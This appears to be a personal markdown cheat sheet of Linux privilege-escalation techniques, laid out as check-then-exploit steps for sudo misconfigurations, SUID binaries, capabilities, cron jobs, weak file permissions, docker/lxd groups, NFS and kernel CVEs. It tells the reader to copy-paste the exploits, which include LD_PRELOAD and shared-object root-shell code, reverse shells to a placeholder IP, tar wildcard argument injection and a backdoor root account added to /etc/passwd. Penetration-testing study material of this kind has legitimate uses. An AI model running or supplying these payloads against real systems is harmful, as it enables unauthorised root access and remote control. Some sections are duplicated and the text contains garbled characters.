# ğŸ§ Ultimate Linux Privilege Escalation Checklist

## ğŸ¯ How to Use
1.  **Enumerate**: Run the `ğŸ” Check`.
2.  **Exploit**: If valid, copy-paste the `ğŸ’¥ Exploit`.

---

## âš¡ 1. Sudo Rights

### 1.1 Shell Escape via Sudo
**Concept:** You can run a binary as root, and that binary can spawn a shell.
- **ğŸ” Check:**
  ```bash
  sudo -l
  # Look for: (root) NOPASSWD: /usr/bin/vim, /usr/bin/less, etc.
  ```
- **ğŸ’¥ Exploit:**
  1.  Search binary on [GTFOBins](https://gtfobins.github.io/).
  2.  Select **Sudo**.
  3.  Run the command shown.
      * Example (vim): `sudo vim -c ':!/bin/sh'`
      * Example (awk): `sudo awk 'BEGIN {system("/bin/sh")}'`

### 1.2 LD_PRELOAD Environment Injection
**Concept:** `env_keep+=LD_PRELOAD` allows loading a malicious library.
- **ğŸ” Check:**
  ```bash
  sudo -l
  # Look for: env_keep+=LD_PRELOAD
  ```
- **ğŸ’¥ Exploit:**
   1. Create shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

  ```bash
  # 2. Compile
  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
  # 3. Run
  sudo LD_PRELOAD=/tmp/shell.so apache2
  ```

### 1.3 CVE-2019-14287 (Sudo Logic Bug)
**Concept:** Permissions forbid root, but allow ALL? Spoof User ID -1.
- **ğŸ” Check:**
  ```bash
  sudo -l
  # Look for: (ALL, !root) /bin/bash
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  sudo -u#-1 /bin/bash
  ```

---

## ğŸ› ï¸ 2. SUID (Set User ID)

### 2.1 Known SUID Binaries
**Concept:** Binary runs as owner (root).
- **ğŸ” Check:**
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  # Look for: nmap, vim, find, bash, cp, base64
  ```
- **ğŸ’¥ Exploit:**
  1.  Search binary on [GTFOBins](https://gtfobins.github.io/).
  2.  Select **SUID**.
  3.  Example (find): `find . -exec /bin/sh -p \; -quit`
 4. _Example (bash):_ `/usr/bin/bash -p`
### 2.2 Shared Object Injection (.so)
**Concept:** Custom SUID binary tries to load a missing library.
- **ğŸ” Check:**
  ```bash
  strace /usr/local/bin/custom-binary 2>&1 | grep -iE "open|access|no such file"
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  # 1. Create lib.c (matching the missing file)
  echo 'static void inject() __attribute__((constructor)); void inject() { system("/bin/bash -p"); }' > lib.c
  # 2. Compile
  gcc -shared -o libcalc.so -fPIC lib.c
  # 3. Run binary
  /usr/local/bin/custom-binary
  ```

### 2.3 PATH Hijacking
**Concept:** SUID binary runs `service` instead of `/usr/sbin/service`.
- **ğŸ” Check:**
  ```bash
  strings /usr/local/bin/suid-binary | grep "service"
  # Look for relative path (e.g., "service")
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  echo '/bin/bash -p' > /tmp/service
  chmod +x /tmp/service
  export PATH=/tmp:$PATH
  /usr/local/bin/suid-binary
  ```
**ğŸ’¥ Exploit:**

1. Create script named `service`: `echo '/bin/bash -p' > /tmp/service`
    
2. Make executable: `chmod +x /tmp/service`
    
3. Hijack PATH: `export PATH=/tmp:$PATH`
    
4. Run binary: `/usr/local/bin/suid-binary`
---

## âš¡ 3. Capabilities

### 3.1 Cap_SetUID
**Concept:** Binary can change its own UID to 0.
- **ğŸ” Check:**
  ```bash
  getcap -r / 2>/dev/null
  # Look for: cap_setuid+ep
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
  **ğŸ’¥ Exploit:**

- **Python:** `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
    
- **Perl:** `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
    
- **Tar:** `tar -cvf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

---

## â° 4. Cron Jobs

### 4.1 Writable Cron Scripts
**Concept:** Root runs a script you can edit.
- **ğŸ” Check:**
  ```bash
  cat /etc/crontab
  # Check write permissions on referenced scripts
  ls -l /path/to/script.sh
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /path/to/script.sh
  ```

### 4.2 Tar Wildcard Injection
**Concept:** Cron runs `tar *`.
- **ğŸ” Check:**
  ```bash
  cat /etc/crontab
  # Look for: tar *
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  cd /target/dir
  echo "mkfifo /tmp/l; cat /tmp/l | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/l" > shell.sh
  touch "--checkpoint-action=exec=sh shell.sh"
  touch "--checkpoint=1"
  ```

---

## ğŸ”‘ 5. Weak Permissions

### 5.1 Writable /etc/passwd
- **ğŸ” Check:**
  ```bash
  ls -l /etc/passwd
  # Look for: -rw-rw-rw-
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  # Add user 'hacker' with pass 'pass123'
  echo "hacker:$(openssl passwd -1 -salt new pass123):0:0:root:/root:/bin/bash" >> /etc/passwd
  su hacker
  ```
**ğŸ’¥ Exploit:**

1. Generate password hash: `openssl passwd -1 -salt new pass123`
    - Output: `$1$new$p7ptkDDZ05G/xxx`
2. Add user to bottom of file:
    Bash
    ```
    echo "hacker:$1$new$p7ptkDDZ05G/xxx:0:0:root:/root:/bin/bash" >> /etc/passwd
    ```
3. Switch user: `su hacker` (Password: `pass123`)
### 5.2 Readable /etc/shadow
- **ğŸ” Check:**
  ```bash
  ls -l /etc/shadow
  # Look for: -rw-r--r--
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  # Copy content to hash.txt on host
  john --wordlist=rockyou.txt hash.txt
  ```

### 5.3 Secrets in History
- **ğŸ” Check:**
  ```bash
  cat ~/.bash_history | grep -i pass
  grep -r "password" /var/www/ 2>/dev/null
  ```

---

## ğŸ³ 6. Docker / Groups

### 6.1 Docker Group
- **ğŸ” Check:**
  ```bash
  id
  # Look for: 999(docker)
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```

### 6.2 LXD Group
- **ğŸ” Check:**
  ```bash
  id
  # Look for: lxd
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  lxc init myimage mycontainer -c security.privileged=true
  lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
  lxc start mycontainer
  lxc exec mycontainer /bin/sh
  ```
**ğŸ’¥ Exploit:**

1. Download `alpine-builder`.
2. Build alpine image and transfer `.tar.gz` to target.
3. Import image: `lxc image import ./alpine.tar.gz --alias myimage`
4. Init container: `lxc init myimage mycontainer -c security.privileged=true`
5. Mount disk: `lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true`
6. Start: `lxc start mycontainer`
7. Execute: `lxc exec mycontainer /bin/sh`
---

## ğŸ“‚ 7. NFS

### 7.1 No Root Squash
**Concept:** Files created as root on the share stay as root on target.
- **ğŸ” Check:**
  ```bash
  cat /etc/exports
  # Look for: no_root_squash
  ```
- **ğŸ’¥ Exploit:**
  ```bash
  # Attacker:
  mount -t nfs <TARGET_IP>:/share /tmp/mnt
  cp /bin/bash /tmp/mnt/bash
  chmod +s /tmp/mnt/bash
  # Target:
  ./bash -p
  ```
**ğŸ’¥ Exploit:**
1. **Attacker:** `mkdir /tmp/nfs; mount -t nfs <TARGET_IP>:/share /tmp/nfs`
2. **Attacker:** `cp /bin/bash /tmp/nfs/bash`
3. **Attacker:** `chmod +s /tmp/nfs/bash` (Set SUID bit)
4. **Target:** `./bash -p` (Run the bash from the share)

---

## â˜¢ï¸ 8. Kernel (Last Resort)

### 8.1 PwnKit (CVE-2021-4034)
- **ğŸ” Check:**
  ```bash
  pkexec --version
  ```
- - Download `PwnKit` script (search GitHub for `CVE-2021-4034`).
- Compile: `gcc PwnKit.c -o PwnKit`
- Run: `./PwnKit`

### 8.2 Dirty Cow
- **ğŸ” Check:**
  ```bash
  uname -r
  # Kernels < 4.8
  ```
- **ğŸ’¥ Exploit:**

1. Download `dirty.c` (search exploit-db).
    
2. Compile: `gcc -pthread dirty.c -o dirty -lcrypt`
    
3. Run: `./dirty password123`
    
4. This usually creates a user `firefart` (or similar) with root permissions.